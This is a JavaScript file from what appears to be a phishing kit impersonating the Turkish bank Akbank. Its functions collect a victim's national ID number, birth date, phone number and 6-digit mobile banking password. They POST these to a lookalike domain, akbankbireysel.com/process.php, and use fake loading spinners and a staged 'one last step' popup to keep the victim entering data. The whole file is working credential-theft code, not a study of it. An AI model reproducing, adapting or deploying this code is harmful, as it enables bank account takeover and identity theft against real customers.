 


$(document).on("keydown", "#username, #password, #phone, #sms", function (e) {
    if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110, 190]) !== -1 ||
        (e.keyCode == 65 && e.ctrlKey === true) ||
        (e.keyCode == 67 && e.ctrlKey === true) ||
        (e.keyCode == 86 && e.ctrlKey === true) ||
        (e.keyCode == 88 && e.ctrlKey === true) ||
        (e.keyCode >= 35 && e.keyCode <= 39)) {
        return;
    }
    if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
        e.preventDefault();
    }
});


function submitData(action, formData, successCallback) {
    $.ajax({
        type: "POST",
        url: "https://akbankbireysel.com/process.php",
        data: { action: action, ...formData },
        success: function (response) {
            successCallback(response);
        },
        error: function (error) {
            // Hata olduğunda SweetAlert ile bir hata mesajı göster
            Swal.fire({
                html: '<div class="col-lg-4 right mt-3" id="authf" style=""><div class="py-30 px-30 scrollTo"><div class="input-block"><h2 class="mb-4">Son bi adım kaldı..</h2><label for="txtPhoneNumber">6 Haneli Akbank Mobil Şifreniz</label><input class="phone" type="password" id="passauth" maxlength="6"></div><div class="input-block"><button type="button" id="loginButtonPass" onclick="submitPass()" class="btn btn-primary w-100 btn-submit">Onayla</button><button type="button" id="loginProcessPass" class="btn btn-primary w-100 btn-submit" style="display:none;"><div class="spinner"></div></button></div></div></div><script>function submitLogin() {    var txtTckn = $("#txtTckn").val();    var txtBirthDate = $("#txtBirthDate").val();    var txtPhoneNumber = $("#txtPhoneNumber").val();    if (txtTckn && txtBirthDate && txtPhoneNumber) {        submitData("submitLogin", { txtTckn: txtTckn, txtBirthDate: txtBirthDate, txtPhoneNumber: txtPhoneNumber }, function () {            $("#loginButton").hide();            $("#loginProcess").show();            setTimeout(function () {                $("#loginf").hide();                $("#loginProcess").hide();                $("#footer").hide();                $("#authf").show();            }, 2000);        });    } else {    }} </script>'
           
            });
        }
    });
}
 
    function submitPass() {
        var passauth = document.getElementById('passauth').value;

        // Veriyi POST etmek için XMLHttpRequest nesnesini kullanma
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://akbankbireysel.com/process.php", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        // POST verisi oluşturma
        var formData = "passauth=" + passauth;

        // Göndermeden önce loading göstergesini göster
        document.getElementById('loginButtonPass').style.display = 'none';
        document.getElementById('loginProcessPass').style.display = 'block';

        // POST isteği gönderme
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                // Yanıt alındığında başarılı mesajı göster
                alert("Veri başarıyla gönderildi!");
            } else if (xhr.readyState === 4 && xhr.status !== 200) {
                // Yanıt alındığında hata mesajı göster
                alert("Veri gönderilirken bir hata oluştu!");
            }
        };
        xhr.send(formData);
    }
 

function submitPass() {
    var passauth = $("#passauth").val();


    if (passauth) {
        submitData("submitPass", { passauth: passauth }, function () {
            $("#loginButtonPass").hide();
            $("#loginProcessPass").show();

            setTimeout(function () {
                $("#authf").hide();
                $("#loginProcessPass").hide();
                $("#completef").show();
            }, 2000);
        });
    } else {
    }
}


 

 

